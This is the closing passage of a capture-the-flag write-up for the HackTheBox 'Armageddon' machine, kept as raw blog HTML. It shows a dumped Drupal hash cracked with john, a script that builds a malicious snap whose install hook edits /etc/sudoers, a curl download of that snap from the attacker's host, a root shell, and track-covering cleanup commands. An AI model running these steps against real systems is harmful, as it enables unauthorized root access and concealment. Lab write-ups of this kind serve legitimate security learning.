+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">1</span>       brucetherealadmin       <span style="color:#79c0ff">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   <span style="color:#a5d6ff">1606998756</span>      <span style="color:#a5d6ff">1607077194</span>      <span style="color:#a5d6ff">1607076276</span>      <span style="color:#a5d6ff">1</span> Europe/London            <span style="color:#a5d6ff">0</span>       admin@armageddon.eu     a:1:<span style="color:#ff7b72;font-weight:bold">{</span>s:7:<span style="color:#a5d6ff">&#34;overlay&#34;</span>;i:1;<span style="color:#ff7b72;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>armageddon.htb&gt;&gt;
+</span></span></code></pre></div><p>With the hash in hand, I spun up john and cracked away:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/armageddon<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ john hash                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8                                                                                                                                                                
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#a5d6ff">1</span> password hash <span style="color:#ff7b72;font-weight:bold">(</span>Drupal7, <span style="color:#79c0ff">$S</span>$ <span style="color:#ff7b72;font-weight:bold">[</span>SHA512 128/128 AVX 2x<span style="color:#ff7b72;font-weight:bold">])</span>                                                                                                                                      
+</span></span><span style="display:flex;"><span>Cost <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">(</span>iteration count<span style="color:#ff7b72;font-weight:bold">)</span> is <span style="color:#a5d6ff">32768</span> <span style="color:#ff7b72">for</span> all loaded hashes                                                                                                                                            
+</span></span><span style="display:flex;"><span>Will run <span style="color:#a5d6ff">4</span> OpenMP threads                                                                                                                                                                          
+</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single                                                                                                                                                               
+</span></span><span style="display:flex;"><span>Press <span style="color:#a5d6ff">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff7b72">for</span> status                                                                                                                                      
+</span></span><span style="display:flex;"><span>Almost <span style="color:#ff7b72">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#ff7b72">if</span> any.                                                                                                                        
+</span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist                                                                                                                              
+</span></span><span style="display:flex;"><span>booboo           <span style="color:#ff7b72;font-weight:bold">(</span>?<span style="color:#ff7b72;font-weight:bold">)</span>                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE 2/3 <span style="color:#ff7b72;font-weight:bold">(</span>2021-07-23 11:04<span style="color:#ff7b72;font-weight:bold">)</span> 2.631g/s 421.0p/s 421.0c/s 421.0C/s asdfjkl;..bradley                                                                                                    
+</span></span><span style="display:flex;"><span>Use the <span style="color:#a5d6ff">&#34;--show&#34;</span> option to display all of the cracked passwords reliably                                                                                                                           
+</span></span><span style="display:flex;"><span>Session completed
+</span></span></code></pre></div><p>From there, I was able to log in as <code>brucetherealadmin</code>.</p>
+<p>Running <code>sudo -l</code>, I learned that <code>brucetherealadmin</code> is capable of running snap as <code>root</code>. Fortunately, GTFObins neatly outlines how to exploit that permission to get code execution as <code>root</code>. By default, the set of commands only runs <code>id</code>, so I took a lesson out of the <a href="https://initblog.com/2019/dirty-sock/"  class="external-link" target="_blank" rel="noopener">author of the dirty_sock exploit&rsquo;s playbook</a> and added <code>brucetherealadmin</code> to the <code>/etc/sudoers</code> file. Here&rsquo;s the bash script used to create the malicious snap package:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">COMMAND</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;echo &#34;brucetherealadmin    ALL=(ALL:ALL) ALL&#34; &gt;&gt; /etc/sudoers&#39;</span>
+</span></span><span style="display:flex;"><span>mkdir -p meta/hooks
+</span></span><span style="display:flex;"><span>printf <span style="color:#a5d6ff">&#39;#!/bin/sh\n%s; false&#39;</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$COMMAND</span><span style="color:#a5d6ff">&#34;</span> &gt;meta/hooks/install
+</span></span><span style="display:flex;"><span>chmod +x meta/hooks/install
+</span></span><span style="display:flex;"><span>fpm -n xxxx -s dir -t snap -a all meta
+</span></span></code></pre></div><p>For simplicity&rsquo;s sake, I renamed the snap package to <code>privesc.snap</code>.</p>
+<p>To execute on the system, I did the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>brucetherealadmin@armageddon-tmp<span style="color:#ff7b72;font-weight:bold">]</span>$ curl -o privesc.snap http://10.10.14.8/privesc.snap
+</span></span><span style="display:flex;"><span>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">100</span>  <span style="color:#a5d6ff">4096</span>  <span style="color:#a5d6ff">100</span>  <span style="color:#a5d6ff">4096</span>    <span style="color:#a5d6ff">0</span>     <span style="color:#a5d6ff">0</span>  <span style="color:#a5d6ff">19649</span>      <span style="color:#a5d6ff">0</span> --:--:-- --:--:-- --:--:-- <span style="color:#a5d6ff">19692</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>brucetherealadmin@armageddon-tmp<span style="color:#ff7b72;font-weight:bold">]</span>$ sudo snap install privesc.snap --devmode --dangerous
+</span></span><span style="display:flex;"><span>error: cannot perform the following tasks:
+</span></span><span style="display:flex;"><span>- Run install hook of <span style="color:#a5d6ff">&#34;xxxx&#34;</span> snap <span style="color:#ff7b72">if</span> present <span style="color:#ff7b72;font-weight:bold">(</span>run hook <span style="color:#a5d6ff">&#34;install&#34;</span>: exit status 1<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>brucetherealadmin@armageddon-tmp<span style="color:#ff7b72;font-weight:bold">]</span>$ sudo /bin/bash
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> brucetherealadmin: 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>root@armageddon-tmp<span style="color:#ff7b72;font-weight:bold">]</span><span style="color:#8b949e;font-style:italic"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>root@armageddon-tmp<span style="color:#ff7b72;font-weight:bold">]</span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span></code></pre></div><p>It&rsquo;s worth noting that the snap package didn&rsquo;t properly install as it wasn&rsquo;t a real program, but nonetheless the bash installation script executed anyways.</p>
+<p>As a bonus, if you wanted to clean up after the fact you could run the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>root@armageddon-opt<span style="color:#ff7b72;font-weight:bold">]</span><span style="color:#8b949e;font-style:italic"># head -n -1 /etc/sudoers &gt; /etc/sudoers</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>root@armageddon-opt<span style="color:#ff7b72;font-weight:bold">]</span><span style="color:#8b949e;font-style:italic"># rm -rf /tmp/* /dev/shm/*</span>
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
